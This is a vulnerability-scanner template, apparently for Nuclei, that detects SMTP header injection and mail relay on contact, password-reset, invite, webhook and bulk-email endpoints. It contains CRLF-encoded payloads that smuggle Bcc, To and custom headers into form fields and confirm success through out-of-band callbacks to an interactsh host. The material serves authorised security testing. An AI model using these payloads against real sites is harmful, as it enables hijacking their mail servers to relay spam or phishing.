http:
- body: '{{email_field}}={{smtp_header_payload_email}}&{{subject_field}}={{smtp_header_payload_subject}}&{{message_field}}={{smtp_header_payload_message}}

    '
  headers:
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
    Content-Type: application/x-www-form-urlencoded
  method: POST
  path:
  - '{{BaseURL}}/contact'
  - '{{BaseURL}}/feedback'
  - '{{BaseURL}}/email'
  - '{{BaseURL}}/sendmail'
  - '{{BaseURL}}/mail'
  - '{{BaseURL}}/newsletter'
  - '{{BaseURL}}/subscribe'
  - '{{BaseURL}}/support'
  payloads:
    email_field:
    - email
    - from
    - sender
    - reply-to
    - to
    message_field:
    - message
    - body
    - content
    - text
    subject_field:
    - subject
    - title
    - topic
- body: "{\n  \"from\": \"{{smtp_header_payload_email}}\",\n  \"to\": \"admin@example.com\"\
    ,\n  \"subject\": \"{{smtp_header_payload_subject}}\",\n  \"message\": \"{{smtp_header_payload_message}}\"\
    ,\n  \"reply_to\": \"{{smtp_header_payload_email}}\"\n}\n"
  headers:
    Accept: application/json
    Content-Type: application/json
  method: POST
  path:
  - '{{BaseURL}}/api/email'
  - '{{BaseURL}}/api/contact'
  - '{{BaseURL}}/api/mail'
  - '{{BaseURL}}/api/sendmail'
- body: 'email={{smtp_header_payload_email}}&action=reset

    '
  headers:
    Content-Type: application/x-www-form-urlencoded
  method: POST
  path:
  - '{{BaseURL}}/reset-password'
  - '{{BaseURL}}/forgot-password'
  - '{{BaseURL}}/password-reset'
- body: "{\n  \"emails\": [\n    \"{{smtp_header_payload_email}}\",\n    \"user2@example.com\"\
    \n  ],\n  \"message\": \"{{smtp_header_payload_message}}\",\n  \"callback_url\"\
    : \"{{callback_url}}/invite-{{relay_id}}\"\n}\n"
  headers:
    Content-Type: application/json
  method: POST
  path:
  - '{{BaseURL}}/invite'
  - '{{BaseURL}}/share'
  - '{{BaseURL}}/forward'
- body: "{\n  \"email\": \"{{smtp_header_payload_email}}\",\n  \"notification_email\"\
    : \"{{test_email}}\",\n  \"backup_email\": \"backup{{smtp_header_payload_email}}\"\
    \n}\n"
  headers:
    Content-Type: application/json
  method: PUT
  path:
  - '{{BaseURL}}/profile'
  - '{{BaseURL}}/account'
  - '{{BaseURL}}/settings/email'
- body: "{\n  \"webhook_url\": \"{{callback_url}}/webhook-{{relay_id}}\",\n  \"email_config\"\
    : {\n    \"from\": \"{{smtp_header_payload_email}}\",\n    \"bcc\": \"{{test_email}}\"\
    ,\n    \"headers\": {\n      \"X-Custom-Header\": \"{{relay_id}}\",\n      \"\
    X-Callback\": \"{{callback_url}}/config-{{relay_id}}\"\n    }\n  }\n}\n"
  headers:
    Content-Type: application/json
  method: POST
  path:
  - '{{BaseURL}}/webhook/email'
  - '{{BaseURL}}/notification/email'
  - '{{BaseURL}}/alert/email'
- body: "{\n  \"template\": \"contact\",\n  \"variables\": {\n    \"sender_email\"\
    : \"{{smtp_header_payload_email}}\",\n    \"reply_to\": \"{{test_email}}\",\n\
    \    \"custom_headers\": \"X-Template-Test: {{relay_id}}\\r\\nX-Callback-Template:\
    \ {{callback_url}}/template-{{relay_id}}\"\n  }\n}\n"
  headers:
    Content-Type: application/json
  method: POST
  path:
  - '{{BaseURL}}/mail/template'
  - '{{BaseURL}}/email/template'
- body: "{\n  \"recipients\": [\n    \"{{test_email}}\",\n    \"{{smtp_header_payload_email}}\"\
    \n  ],\n  \"subject\": \"Bulk Email Test {{relay_id}}\",\n  \"message\": \"{{smtp_header_payload_message}}\"\
    ,\n  \"sender\": \"{{smtp_header_payload_email}}\",\n  \"callback\": \"{{callback_url}}/bulk-{{relay_id}}\"\
    \n}\n"
  extractors:
  - internal: true
    kval:
    - interactsh_request
    part: interactsh_request
    type: kval
  - group: 1,2
    part: interactsh_request
    regex:
    - /(email-header|subject-header|message-header|invite|webhook|config|template|bulk)-([a-z0-9]+)
    type: regex
  - group: 1
    part: interactsh_request
    regex:
    - X-Mailer:\s*HeaderInjection-([a-z0-9]+)
    type: regex
  - group: 1
    part: interactsh_request
    regex:
    - X-Injected-Subject:\s*([a-z0-9]+)
    type: regex
  - group: 1
    part: interactsh_request
    regex:
    - X-Callback[^:]*:\s*([^\s]+)
    type: regex
  headers:
    Content-Type: application/json
  matchers:
  - condition: or
    part: interactsh_protocol
    type: word
    words:
    - http
    - smtp
  - condition: or
    part: interactsh_request
    type: word
    words:
    - email-header-
    - subject-header-
    - message-header-
    - invite-
    - webhook-
    - config-
    - template-
    - bulk-
  matchers-condition: and
  method: POST
  path:
  - '{{BaseURL}}/bulk-email'
  - '{{BaseURL}}/mass-mail'
  - '{{BaseURL}}/broadcast'
id: smtp-header-injection-relay-oob
info:
  author: geeknik
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:H/A:L
    cvss-score: 8.3
    cwe-id: CWE-93,CWE-20
  description: 'Detects SMTP header injection vulnerabilities that allow attackers
    to inject

    arbitrary SMTP headers and relay emails through the target''s mail server.

    Uses OOB confirmation via email delivery to controlled mailbox and HTTP callbacks

    to verify successful mail relay abuse.

    '
  name: SMTP Header Injection with Mail Relay OOB Detection
  reference:
  - https://owasp.org/www-community/vulnerabilities/Mail_Header_Injection
  - https://portswigger.net/kb/issues/00200800_smtp-header-injection
  - https://book.hacktricks.xyz/pentesting-web/email-header-injection
  - https://cwe.mitre.org/data/definitions/93.html
  severity: high
  tags: smtp,email,header-injection,mail-relay,oob,injection
variables:
  callback_url: '{{interactsh-url}}'
  relay_id: '{{randstr}}'
  smtp_header_payload_email: 'test@example.com%0d%0aBcc: {{test_email}}%0d%0aX-Mailer:
    HeaderInjection-{{relay_id}}%0d%0aX-Callback: {{callback_url}}/email-header-{{relay_id}}

    '
  smtp_header_payload_message: 'Test message content.%0d%0a%0d%0aTo: {{test_email}}%0d%0aSubject:
    Injected Email via {{relay_id}}%0d%0aX-Callback-Message: {{callback_url}}/message-header-{{relay_id}}%0d%0a%0d%0aThis
    email was injected via SMTP header injection vulnerability.

    '
  smtp_header_payload_subject: 'Test Subject%0d%0aBcc: {{test_email}}%0d%0aX-Injected-Subject:
    {{relay_id}}%0d%0aX-Callback-Subject: {{callback_url}}/subject-header-{{relay_id}}

    '
  test_email: test-{{randstr}}@{{interactsh-url}}
